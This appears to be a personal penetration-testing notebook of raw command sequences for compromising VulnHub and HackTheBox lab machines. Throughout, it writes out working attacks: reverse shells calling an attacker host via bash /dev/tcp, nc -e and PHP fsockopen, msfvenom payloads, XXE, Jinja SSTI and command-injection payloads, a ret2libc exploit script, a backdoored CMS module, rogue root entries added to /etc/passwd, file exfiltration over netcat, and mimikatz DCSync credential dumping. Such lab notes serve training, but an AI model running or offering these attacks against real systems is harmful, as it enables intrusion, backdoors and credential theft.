nmap 10.1.1.27 -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local", ldap.password="qMDdyZh3cT6eeAWD"'
ldapsearch -h 10.1.1.27 -p 389 -b "dc=symfonos,dc=local" -w 'qMDdyZh3cT6eeAWD' -D "cn=admin,dc=symfonos,dc=local"
	##got credentials
	userPassword:: Y2V0a0tmNHdDdUhDOUZFVA==
	mail: zeus@symfonos.local
	gecos: Zeus User
ssh zeus@10.1.1.27
sudo -l
		##abuse dpkg
		##create debian pakage
nano 5shell.sh
	#!/bin/bash
	/bin/bash
apt-get install ruby ruby-dev rubygems build-essential
man gem
gem install fpm
gem2.8 --version
gem2.8 install fpm
fpm -s dir -t deb -n exploit –before-install 5hell.sh .
python -m SimpleHTTPServer 8888
wget http://10.1.1.5:8888/exploit_1.0_amd64.deb
sudo -u root dpkg -i exploit_1.0_amd64.deb
cat proof.txt



Me and My Girlfriend: 1
====================================
nmap -sC -sV -A -p- 10.1.1.28 -o nmap
http://10.1.1.28
	##add request from burp
	X-Forwarded-For: localhost
http://10.1.1.28?page=register
http://10.1.1.28?page=login
http://10.1.1.28?page=profile&user_id=12
http://10.1.1.28?page=progile&user_id=5
	##url injection and got credentials
	alice:4lic3
	eweuhtandingan:skuytuh
	sundatea:indONEsia
	sedihangmah:cedihhihihi
ssh alice@10.1.1.28
sudo -l
		##php priveledge escalation
sudo /usr/bin/php -r '$sock=fsockopen("10.1.1.5",4343);exec("/bin/sh -i <&3 >&3 2>&3");'
wget http://10.1.1.5:8888/shell.php
sudo php shell.php
nv -lvp 3434
echo "rooot:`openssl passwd -1 -salt ignite pass123`:0:0:root:/root:/bin/bash


Serial: 1
==================================
nmap -sC -sV -A -p- 10.1.1.30 -o nmap
dirb http://10.1.1.30
	##decode cookie with base64
curl -v http://10.1.1.30/bakcup/
	##unzip file
php user.class.php
cat user.class.php
	##log.class.php didnt call at all
	##edit user.class.php and call log.class.php
	##add echo base64_encode(serialize(new User('admin')));
php user.class.php
python -m SimpleHTTPServer 8888
	##include our file shell.php
http://10.1.1.30/index.php?c=ls+/
http://10.1.1.30/index.php?c=cat+/credentials.txt.bak
	##got credentials sk4:KywZmnPWW6tTbW5w
ssh sk4@10.1.1.30
sudo -l
sudo vim -c ':!/bin/sh'
	##vim privsc
	##https://gtfobins.github.io
	



Serial: 2
==================================
nmap -sS -sV -T4 -A -p- 10.1.1.31
dirb http://10.1.1.31
	##download serial2.apk
http://10.1.1.31/api
apktool d serial2.apk
grep -ir basic_auth apkserial2/*
	##add to header API request "Authorization: Basic c2s00mgiaueiijnbij9TEE"
http://10.1.1.31/nmap?ip=127.0.0.1 | ls -laht
http://10.1.1.31/nmap?ip=127.0.0.1 | which bash nc sh
http://10.1.1.31/nmap?ip=127.0.0.1 | nc 10.1.1.5 4343 -e /bin/bash
nc -lvp 4343
which git
tar -zcvf /serial2/public/serial2.tar.gz /serial2
cat serial2.tar.gz | nc 10.1.1.5 4321
nc -lvp 4321 > serial2.tar.gz
wget http://10.1.1.31/serial2.tar.gz
tar -xzvf serial2.tar.gz
cd serial2
git log
git checkout b0398adn9173hiudsahf9h193hijasd67c3
chmod 600 id_rsa
ssh -i id_rsa sk4@10.1.1.31
id
python linuxprivchecker.py > report.txt
find / -perm -u=s -type f 2>/dev/null
find / -writable -type f 2>/dev/null >/tmp/report.txt
grep -Ev '/proc|/sys|app' /tmp/report.txt
uname -a
find / -name backd00r 2>/dev/null
cat /bin/backd00r | nc 10.1.1.5 4321
nc -lvp 4321 > backd00r
file backd00r
strings backd00r
	##find credz "j&9GCS34MY+^4ud*"
cat /proc/sys/kernel/randomize_va_space
cat /lib/x86_64-linux-gnu/libc.so.6 | nc 10.1.1.5 4321
nc -lvp 4321
gdb backd00r
>checksec
>run
> ## input "admin" & ctrl+c to find the memory location
>b *login+184
>run
> ##login with credz
>python -c 'print "A"*72+"B"*6'
>pattern_create 200
>c
> ##input python pattern
>exit
	##offside at 72
	##exploit https://raw.githubusercontent.com/andersongomes001/vulnhub/master/serial2/xpl.py






Scarecrow
===================================
dirb http://10.1.1.32 /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt
http://10.1.1.32/scarecrow/
http://10.1.1.32/scarecrow/login.php
	##XXE Injection
	//<%3fxml+version%3d"1.0"%3f><!DOCTYPE+root+[<!ENTITY+test+SYSTEM+'file%3a///etc/passwd'>]><root><user>%26test%3b</user></root>
auth=<%3fxml+version%3d"1.0"%3f><!DOCTYPE+root+[<!ENTITY+test+SYSTEM+'php://filter/convert.base64-encode/resource=/var/www/html/scarecrow/personal_secret_admin_page.php'>]><root><user>%26test%3b</user></root>
auth=<%3fxml+version%3d"1.0"%3f><!DOCTYPE+root+[<!ENTITY+test+SYSTEM+'php://filter/convert.base64-encode/resource=/var/www/html/scarecrow/login.php'>]><root><user>%26test%3b</user></root>
	##OS command injection ping ip escape with "%0a" = "%250A"
auth=<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE creds [ <!ELEMENT creds ANY ><!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=http://127.0.0.1/scarecrow/personal_secret_admin_page.php?ip=10.1.1.32%250Als' >]><creds><user>%26xxe;</user><pass>pass</pass></creds>
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.1.1.5 LPORT=4343 -f raw -o shell.php
python -m SimpleHTTPServer 8000
auth=<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE creds [ <!ELEMENT creds ANY ><!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=http://127.0.0.1/scarecrow/personal_secret_admin_page.php?ip=192.168.56.118%250Awget%2520http%253A%252F%252F10.1.1.5%253A8000%252Fshell.php' >]><creds><user>%26xxe;</user><pass>pass</pass></creds>
use exploit/multi/handler 
set LHOST 10.1.1.5
set LPORT 4343
set PAYLOAD php/meterpreter/reverse_tcp 
exploit
nc -lvp 4343
stty raw -echo
fg
reset
binwalk -e personal_backup.jpg
zip2john personal_backup.jpg > hash.txt
john --wordlist=/home/rockyou.txt hast.txt
	##got credz #beautifull_root1999!
ssh paw-sk4@10.1.1.32
cat backup.py
cd /var/www/paw-sk4-experiments/
touch ./'"";$(chmod 4755 $(which find))'
find . -exec /bin/sh -p \; -quit
	##file will execute something like this
	##cp "/var/www/paw-sk4-experiments/"";$(touch haha)'" /tmp/




Jigsaw
===================================
nmap -sV -A 10.1.1.33
	##filter with wireshark and find udp packet
echo "j19s4w" | nc -u IP 666
apt-get install knockd
knock 10.1.1.33 5500 6600 7700
http://10.1.1.33
wget http://10.1.1.33/jigsaw.gif
strings jigsaw.gif
http://10.1.1.33/w4n770p14y494m3/
	##vulnerable to XXE
	//<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><root><email>&xxe;</email><password></password></root>
	//<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/knockd.conf" >]><root><email>&xxe;</email><password></password></root>
knock 10.1.1.33 7011 8011 9011
ssh jigsaw@10.1.1.33
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
/bin/game3
ldd /bin/game3 | grep libc					##check ALSA
cat /proc/sys/kernel/randomize_va_space		##check ASLR
echo 0 > /proc/sys/kernel/randomize_va_space	##disable but need root https://docs.oracle.com/html/E36387_03/ol_kernel_sec.html
scp jigsaw@10.1.1.33:/bin/game3 .
gdb game3
	##ret to libc https://spz.io/2018/10/18/buffer-overflow-return-to-libc/
ldd /bin/game3													##libc base address
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system			##libc system address
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit			##libc exit address
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh	##libc bin sh address
exploit script:
===============
from subprocess import call
import struct

libc_addr = 0xb752e000
sys_addr = struct.pack("<I", libc_addr+0x00040310)
sh_addr = struct.pack("<I", libc_addr+0x00162d4c)
exit_addr = struct.pack("<I", libc_addr+0x00033260)

buf = "A"*76
buf += sys_addr
buf += exit_addr
buf += sh_addr

i = 0
while(i<512):
    print("Try: %s" % (i))
    print(buf)
    i += 1
    ret = call(["/bin/game3", buf])
===============
python exp.py
echo "rooot:`openssl passwd -1 -salt ignite godmode`:0:0:root:/root:/bin/bash" >> /etc/passwd




Cynix: Cyber Phoenix
====================================
nmap -sC -sV -A -p- 10.1.1.38 -o nmap
dirb http://10.1.1.38
wfuzz -c -w /usr/wordlists/dir-medium.txt -hc 404 http://10.1.1.38/FUZZ
dirb http://10.1.1.38/lavalamp/
	##submit form and directed to canyoubypassme.php
curl http://10.1.1.38/lavalamp/canyoubypassme.php
	##inspect element and change opacity to 0.5
	##submit 1../../../../etc/passwd
curl http://10.1.1.38/lavalamp/canyoubypassme.php?file=1../../../etc/passwd&read=Download+the+number
curl http://10.1.1.38/lavalamp/canyoubypassme.php?file=1../../../home/ford/.ssh/id_rsa&read=Download+the+number
echo > id_rsa_ford
echmod 600 id_rsa_ford
ssh ford@10.1.1.38 -p 6688 -i id_rsa_ford
id
groups
	##LXD priviledge excalation
	##download repo in local
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
python -m SimpleHTTPServer 8888
	##upload to target and install
wget http://10.1.1.38/alphine.tar.gz
lxc image import ./apline.tar.gz --alias myimage
lxc image list
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
mnt/root/root
	##now we can mount every file in system as root
ls





Sniper HTB
===================================
nmap -sC -sV -o nmap 10.10.10.151
smbclient -L \\10.10.10.151
http://10.10.10.151
http://10.10.10.151
gobuster dir -w /yusr/share/wordlist/dirbuster/dir-2.small.txt -t 5 -x php -u http://10.10.10.151/blog/ -o diruser.txt
http://10.10.10.151/blog/?lang=blog-es.php
http://10.10.10.151/blog/?lang=css/style.css
http://10.10.10.151/blog/?lang=php://filter/convert.base64-encode/resource=index.php
nc -lvp 445
http://10.10.10.151/blog/?lang=##10.10.4.74\htb\asd.asd
impacket-smbserver -smb3support htb /home/sniperhtb/
http://10.10.10.151/blog/?lang=##10.10.4.74\htb\nmap
nano /etc/samba/smb.conf
	[htb]
		comment = entot
		path = /home/sniperhtb/
		guest ok = yes
		browseable = yes
		create mask = 0600
		writeable = yes
systemctl start smbd
smbclient -L ##10.10.4.74/htb/
http://10.10.10.151/blog/?lang=##10.10.4.74\htb\nmap
echo '<?php system($_REQUEST("asd"));?>' > 5hell.php
http://10.10.10.151/blog/?lang=##10.10.4.74\htb\5hell.php?asd=systeminfo
http://10.10.10.151/blog/?lang=##10.10.4.74\htb\dxnboy.php
http://10.10.10.151/blog/?lang=##10.10.4.74\htb\nc.exe
nc.exe 10.10.4.74 4343 -e powershell
rlwarp nc -lvp 4343
Get-WmiObject -Class Win32_UserAccount
cd C:\inetpub\wwwroot\
gci -recurse | select Fullname
gc db.php
net user Chris
crackmapexec smb 10.10.10.151 -u Chris -p '36mEAhz/B8xQ~2VM'
$user = 'SNIPER\Chris'
$pass = '36mEAhz/B8xQ~2VM'
$secpass = ConvertTo-SecureString $pass -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $secpass)
$cred
Invoke-Command -ComputerName sniper -Credential $cred -ScriptBlock {whoami}
Invoke-Command -ComputerName sniper -Credential $cred -ScriptBlock {//10.10.4.74/htb/nc.exe 10.10.4.74 4321 -e powershell}
rlwrap nc -lvp 4321
netstat -an
cd C:\Users\Chris
gci -recurse | select Fullname
chmod 777 /home/sniperhtb/
copy instruction.chm ##10.10.4.74\htb\
file instruction.chm
	##download it to windows machine and start wordking with windows
	wget instruction.chm .
	wget nishang/Client/Out-CHM.ps1
	PS C:\Users\prashant\Desktop>certutil -urlcache -split -f https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1
	import-module .\out.chm.ps1;out-chm -Payload "C:\Users\Chris\Download\nc.exe -e powershell 10.10.4.74 4141" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
	copy doc.chm ##10.1.1.5\htb\
cd C:\docs
echo asd > asd.chm
echo asd > asd.txt
dir				##asd.chm got excuted by big boss
copy ##10.10.4.74\htb\doc.chm .
rlwrap nc -lvp 4141



Resolute HTB
===================================
nmap -sC -sV -A -p- 10.10.10.169 -o nmap
enum4linux 10.10.10.169
	##got creds
	##some active user and credz Welcome123!
	##try login bruteforce via smb with metasploit
msfconsole
use auxiliary/scanner/smb/smb_login
>set RHOST 10.10.10.169
>set USER_FILE users.txt
>set smbpass Welcome123!
>set smbdomain MEGABANK
>run
	##got creds
	##MEGBANK\melanie:Welcome123!
ldapdomaindump -u MEGABANK\\melanie -p Welcome123! 10.10.10.169
file:////home/resolutehtb/ldapenum/domain_users.html
evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!
net user melanie /domain
cd c:
Get-ChildItem -Force
cd PSTranscripts
Get-ChildItem -Force
cat PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
	##got creds
	##ryan:Serv3r4Admin4cc123!
evil-winrm -i 10.10.10.169 -u ryan -p Serv3r4Admin4cc123!
[Environment]::Is64BitOperatingSystem
net user ryan /domain
	##domain priv excalation: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise
msfvenom -p windows/x64/exec cmd='net group "domain admins" melanie /add /domain' --platform windows -f dll > /home/kali/dns.dll
dnscmd RESOLUTE /config /serverlevelplugindll \\10.10.14.156\htb\dnsku.dll
sc.exe \\RESOLUTE stop dns
sc.exe \\RESOLUTE start dns
evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!
whoami /all



Tempus Fugit 3
=======================================================
nmap -sC -sV -A -p- 10.10.10.29 -o nmap
10.1.1.29/${7*7}
10.1.1.29/{{7*7}}
10.1.1.29/{{7*'7'}}			##vulnerable Server Site Template Injection (SSTI) with Jinja template
							##abuse Jinja SSTI: https://github.com/vulhub/vulhub/tree/master/flask/ssti
http://10.1.1.29/%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D
nc -lvp 4343
							##reverse shell encode it with url burp
http://10.1.1.29/{{''.__class__.__mro__[1].__subclasses__()[373]("bash -c 'bash -i >& /dev/tcp/10.1.1.5/4343 0>&1'",shell=True,stdout=-1).communicate()[0].strip()}}
stty raw -echo
fg
reset
python -c 'import pty;pty.spawn("/bin/bash")'
cat /srv/flask_app/app.py
which sqlcipher
sqlcipher static/db2.db --interactive
>pragma key='SecretssecretsSecrets...'
>.tables
>select * from users;
		##got credz
		hugh-janus|S0secretPassW0rd
		anita-hanjaab|ssdf%dg5xc
		clee-torres|asRtesa#2s
		RmxhZzN7IEhleSwgcmVhZGluZyBzZWNyZXRzICB9|
for i in {1..254} ;do (ping -c 1 192.168.100.$i | grep "bytes from" &) ;done
which git
cd /tmp
git clone https://github.com/In2econd/portscanner
python portscanner/portscanner.py 192.168.100.100 1 65535
		##got open port 80 and 45844
ssh -N -R 5555:192.168.100.1:443 root@10.1.1.5
http://127.0.0.1:5555
http://127.0.0.1:5555/processwire
		##login with this credentials admin:S0secretPassW0rd
git clone https://github.com/EnableSecurity/wafw00f
wafw00f/wafw00f -a http://127.0.0.1:5555/proceswire/page/edit/\?id\=21\c=whoami
http://127.0.0.1:5555/processwire/module
		##download module from https://modules.processwire.com/modules/helloworld/ then edit to put a backdoor and upload
unzip HelloWorld.zip
nano helloworld.module.php
		$this->addHookBefore('ProcessPageEdit::execute', function($event) {
			$page = $event->object->getPage(); ## getPage() is a method in ProcessPageEdit
			if($page->id == 1) {
				## user is editing the homepage
				$event->message("Hello {$event->user->name} - You are editing the homepage!");
			} else {
				system(base64decode($_GET['c']));
			}
			});
zip -r a.zip HelloWorld/
		##upload and install
http://127.0.0.1:5555/processwire/page/edit/?id=21&c=d2hvWYH1						##base64 encode from whoami
http://127.0.0.1:5555/processwire/page/edit/?id=21&c=m2JY28Bl8slo18LSJi8718n13b		##base64 encode from /bin/netcat -e /bin/sh 10.1.1.5 4114
nc -lvp 4114





Tempus Fugit 1
============================================
nmap -sC -sV -A -p- 10.1.1.40 -o nmap
http://10.1.1.40/upload
	##RCE with wildcard
	##decimal and hex ip address to bypass wildcard download script: https://github.com/4ndr34z/MyScripts/blob/master/ip2dh.py
	##intercept and make file asd.txt;nc 167859215 4343 -e sh
nc -lvp 4343
python -c 'import pty;pty.spawn("/bin/bash")'
^Z
stty raw -echo
fg
reset
cat main.py
		##got credz someuser:b232a4da4c104798be4613ab76d26efda1a04606
cd /root
cat .ncftp/trace.234
ifconfig
for i in {1..254} ;do (ping -c 1 172.19.0.$i | grep "bytes from" &) ;done
for i in $(seq 1 65535); do nc -nvz -w 1 172.19.0.12 $i 2>&1; done | grep -v "Connection refused"
which lftp
lftp someuser@172.19.0.12
>ls
>cat cmscreds.txt
		##got credz admin:hardEnough4u
>exit
for i in $(seq 1 65535); do nc -nvz -w 1 172.19.0.1 $i 2>&1; done | grep -v "Connection refused"
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.107 lport=4444 -f elf > shell.elf
python -m SimpleHTTPServer 8888
wget http://10.1.1.5:8888/shell.elf .
chmod +x shell.elf
./shell.elf
msfconsole
>use exploit/multi/handler
>set lport 4444
>set lhost 10.1.1.5
>show payloads
>set payload linux/x86/meterpreter/reverse_tcp
>run
netstat -lntp
kill 9				##kill port 80 to enable port forwarding
netstat -lntp
>portfwd add -l 6060 -p 8080 -r 172.19.0.1
cat /etc/resolv.conf
search mofo.pwn
apk list dig
apk add bind-tools
dig axfr mofo.pwn
				##got domain CNAME ourcms.mofo.pwn
				##and it into kali /etc/hosts 127.0.0.1	ourcms.mofo.pwn
http://ourcms.mofo.pwn:6060
http://ourcms.mofo.pwn:6060/admin
				##login with this credz admin:hardEnough4u
				##edit templat and add reverse shell
				//<?php exec('nc -e /bin/sh 10.1.1.5 4321'); ?>
nc -lvp 4321
find / -perm -4000 -type f 2>/dev/null
responder -I eth0
			##set responder from kali
			##got credz ireland:school
su ireland
ssh ireland@10.1.1.40
cd /var/mail
cat ireland
			##got credz benni:9y4lw0r82kl3
su benni
sudo -l
sudo lua -e 'os.execute("/bin/sh")'
sudo cpulimit -l 100 -f /bin/sh







Tempus Fugit 2
=====================================
nmap -sC -sV -A -p- 10.1.1.41 -o nmap
wpscan -u http://10.1.1.41 -e u
		##set listener on wireshark
		##request reset password will trigger SMTP request
		##smtp.tempusfugit2.com  & smtp.tempusfugit2.com.localdomain
nano /etc/ettercap/etter.dns
		*.tempusfugit2.com      A       10.1.1.41
		*.tempusfugit2.com.localdomain      A       10.1.1.41
python -m smtpd -n -c DebuggingServer 10.1.1.41:25
>open ettercup
>unified sniffing
>scan host
>select host add to target
>MITM >arp sppofing >sniff remote connection
>manage plugin >dns spoof
		##forgot password and email request will spoffed to our kali python mail server
		##follow the link and login
		##reverse shell
nc -lvp 4343
cat nb.txt
		##got credz sada:9s4lw0r82cs5
knock 1981 867 5309
nmap -p- 10.1.1.41
ssh sada@9s41w0r82cs5
sudo -l
sudo -u migdalia timedatectl list-timezone
		##escape with !/bin/bash
hydra -l migdalia -P rockyou.txt ssh://10.1.1.41:22
		##got credz migdalia:manchester
ssh migdalia@10.1.1.41
sudo -l
cat list
sudo docker exec -it 1786dd63dedb bash
cd wp-content/TFDocument
		##create suid binary command
nano suid.c
	int main(void) {
       setgid(0); setuid(0);
       execl("/bin/sh","sh",0);
	}
gcc suid.c -o suid
python -m SimpleHTTPServer 8888
wget http://10.1.1.41/suid .
chmod 4755 suid
exit
ls -lah
./suid




InfoSec Prep: OSCP
=======================================
nmap -sC -sV -A -p- 10.1.1.53 -o nmap
dirb http://10.1.1.53
http://10.1.1.53/robots.txt
curl http://10.1.1.53/secret.txt | base64 -d > sshkey
chmod 600 shhkey
ssh oscp@10.1.1.53 -i sshkey
id
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
python -m SimpleHTTPServer 8888
wget http;//10.1.1.5:8888/alphine.tar.gz . 
which lxd
which lxc
run /snap/bin/lxc
cd /snap/bin
./lxc image import alphine.tar.gz --alias myimage
./lxc init myimage ignite -c security.privileged=true
		##got error & need to init lxd
./lxd init
		##yes to all
./lxc init myimage ignite -c security.privileged=true
./lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
./lxc start ignite
./lxc exec ignite /bin/sh
id
cd /mnt/root/root
ls
cat flag.txt
		##d73b04b0e696b0945283defa3eee438
		##d73b04b0e696b0945283defa3eee4538





Election
=====================================
nmap -sC -sV -A -p- 10.1.1.54 -o nmap
dirb http://10.1.1.54
dirb http://10.1.1.54/election/ -X .php,.html,.txt,.log
http://10.1.1.54/election/card.php
		##decript binary to text
		 ##got credz 1234:Zxc1234#!
http://10.1.1.54/election/admin
http://10.1.1.54/election/system.log
		##got credz love:P@ssw0rd@123
ssh love@10.1.1.54
sudo -l
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
searchsploit serv-u
		##search on google serv-u priviledge escalation and compile
gcc exp.c -o exp
./exp
id
cat /root/root.txt





Cascade HTB
====================================
nmap -p- --min-rate 10000 10.10.10.182 -o nmap 
nmap -sC -sV -A -p `cat nmap | grep open | cut -d "/" -f1 | tr "\n" ","` 10.10.10.182 -o service.nmap
smbclient -N -L //10.10.10.182
smbmap -H 10.10.10.182
rpcclient -U '' -N 10.10.10.182
>?
>enumdomusers
		##got list of users
>exit
ldapsearch -h 10.10.10.182 -x -s base namingcontexts
ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" > ldap-anonymous.txt
ldapsearch -h 10.10.10.182 -x -b 'dc=cascade,dc=local'  "(objectclass=*)" > ldap-object.txt
cat ldap-* | grep -i password,pass,pwd,cascadeLegacyPwd
		##got r.thompson passwd
cat thompsonpwd.txt | base64 -d
smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva
mkdir smbdump-thompson && cd smbdump-thompson
smbclient -U r.thompson //10.10.10.182/Data rY4n5eva
>mask ""
>recurse ON
>prompt OFF
>mget *
>exit
find type -f
cat IT/Email Archives/Meeting_Notes_June_2018.html
cat IT/Temp/s.smith/VNC Install.reg
		##get passwd hex VNC 6b,cf,2a,4b,6e,5a,ca,0f
git clone https://github.com/trinitronx/vncpasswd.py
vncpasswd.py -d -H 6bcf2a4b6e5aca0f
		##got credz s.smith
evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182
>[environment]::OSVersion.Version
>net user s.smith
>net localgroup "Audit Share"
smbmap -H 10.10.10.182 -u s.smith -p sT333ve2
mkdir smbdump-smith && cd smbdump-smith
smbclient -U s.smith //10.10.10.182/Audit$ sT333ve2
>mask ""
>recurse ON
>prompt OFF
>mget *
>exit
find type -f
file Audit.db
sqlite3 Audit.db
>.tables
>select * from DeletedUserAudit;
>select * from Ldap;
cat RunAudit.bat
file CascAudit.exe
		##decompile CascAudit.exe
		##got credz arksvc:w3lc0meFr31nd
decrypt from here: https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)AES_Decrypt(%7B'option':'UTF8','string':'c4scadek3y654321'%7D,%7B'option':'UTF8','string':'1tdyjCbY1Ix49842'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)&input=QlFPNWw1S2o5TWRFclh4NlE2QUdPdz09
evil-winrm -u arksvc -p "w3lc0meFr31nd" -i 10.10.10.182
>net user arksvc
>Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects" -and samaccountname -eq "TempAdmin"' -includeDeletedObjects -property *
		##recover deleted account "TempAdmin"
		##credz base64 cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz
nano passwdadmin.txt | base64 -d
		##recovered and got credz administrator:baCT3r1aN00dles
evil-winrm -i 10.10.10.182 -u administrator -p baCT3r1aN00dles






Sauna HTB
====================================
pport=$(nmap -Pn -p- --min-rate=10000 -T4 10.10.10.175 | grep ^[0-9] | cut -d "/" -f1 | tr "\n" "," | sed s/,$//); nmap -sC -sV -A -p $pport 10.10.10.175 -o nmap
ldapsearch -h 10.10.10.175 -x -s base namingcontexts
ldapsearch -h 10.10.10.175 -x -b "DC=EGOTISTICAL-BANK,DC=LOCAL" > ldap-anonymous.txt
ldapsearch -h 10.10.10.175 -x -b "DC=EGOTISTICAL-BANK,DC=LOCAL" 'objectClass=*'> ldap-objectclass.txt
rpcclient -U "" 10.10.10.175
> enumdomusers
> querydominfo
		\rpc can login anonymous but dennied query
ls /usr/share/doc/python3-impacket/examples
cp /usr/share/doc/python3-impacket/examples/GetADUsers.py .
./GetADUsers.py -all -no-pass -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/
less /usr/share/doc/python3-impacket/examples/GetNPUsers.py
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile user.txt -dc-ip 10.10.10.175
		##got credz kerebros hash ssmith
hashcat -h | grep -i kerberos
hashcat -m 18200 kerberos-fsmith-hash.txt /home/rockyou.txt -o pass.txt
		##got credz fsmith:Thestrokes23
evil-winrm -i 10.10.10.175 -u fsmith -p 'Thestrokes23'
>type ../Desktop/user.txt
		##download winpeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases
python -m SimpleHTTPServer 8888
>invoke-webrequest -url http://10.10.14.65:8888/WinPEASany.exe -outfile winpeas.exe
>./winpeas.exe
		##got credz svc_loanmanager:Moneymakestheworldgoround!
evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
		##dowload mimikatz
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200715/mimikatz_trunk.zip
unzip mimikatz_trunk.zip
cd Win32
python -m SimpleHTTPServer 8888
>invoke-webrequest -url http://10.10.14.65:8888/mimikatz.exe -outfile mimikatz.exe
.\mimikatz.exe "lsadump::dcsync /user:Administrator" "exit"
		##got credz administrator hash 
evil-winrm -i 10.10.10.175 -H d9485863c1e9e05851aa40cbb4ab9dff -u Administrator
		##another dump with impacket secretdump
ls /usr/share/doc/python3-impacket/examples
secretdump.py egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175
		##got credz administrator hash




Remote HTB
====================================
pport=$(nmap -Pn -p- --min-rate=10000 -T4 10.10.10.180 | grep ^[0-9] | cut -d "/" -f1 | tr "\n" "," | sed s/,$//); nmap -sC -sV -A -p $pport 10.10.10.180 -o nmap
dirb http://10.10.10.180/ -x .php,.html,.txt,.log
showmount -e 10.10.10.180
		##from mount port 2049 got mount directory site_backups
mount 10.10.10.180:/site_backups site_backups/
umount site_backups
ls site_backups/
strings site_backups/App_Data/Umbraco.sdf | grep admin
		##got umbraco creds SHA1
john hash-umbraco.txt --format=Raw-SHA1 --wordlist=/home/rockyou.txt
		##got credz admin@htb.local:baconandcheese
searchsploit umbraco
searchsploit -m 46153
		##another umbraco RCE: https://github.com/noraj/Umbraco-RCE/blob/master/exploit.py
ls /usr/share/windows/binary/
cp /usr/share/windows/binary/nc.exe .
python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a 'ls c:/'
python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a 'c:/windows/temp/nc.exe 10.10.14.78 4343 -e cmd.exe'
nc -lvp 4343
>whoami
>type c:/Users/Public/user.txt
>certutil -urlcache -split -f http://10.10.14.78:8888/winPEASany.exe c:/windows/temp/winpeas.exe
>winpeas.exe
		##got two privilege escalation method
>whoami /priv
>wmic service where started=true get name, startname
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.78 LPORT=4141 -f exe > exp.exe
>certutil -urlcache -split -f http://10.10.14.78:8888/exp.exe c:/windows/temp/exp.exe
>sc config usosvc binpath="c:\windows\temp\exp.exe"
>sc stop usosvc
nc -lvp 4141
>sc start usosvc
>type C:\Users\Administrator\Desktop\root.txt
		##another technique with meterpreter
msfconsole
>use exploit/multi/handler
>show payloads
>set payload windows/meterpreter/reverse_tcp
>set lhost 10.10.14.78
>set lport 4141
>exploit
>exp.exe
>shell
>exit
>run post/windows/gather/credentials/teamviewer_passwords
		##got TM7 credz REMOTE:!R3m0te!





Fuse HTB
===================================
nmap -Pn -p- --min-rate=10000 -T4 10.10.10.180 | grep ^[0-9] | cut -d "/" -f1 | tr "\n" "," | sed s/,$//
http://10.10.10.193
http://fuse.fabricorp.local/papercut/logs/html/index.htm
		//got user pmerton, tlavel, sthompson, bhult
git clone https://github.com/digininja/CeWL
cewl.rb -d 5 -m 3 -w pass.lst  http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers
msfconsole
>use auxiliary/scanner/smb/smb_login
>set rhost 10.10.10.180
>set user_file user.txt
>set pass_file pass.txt
>exploit
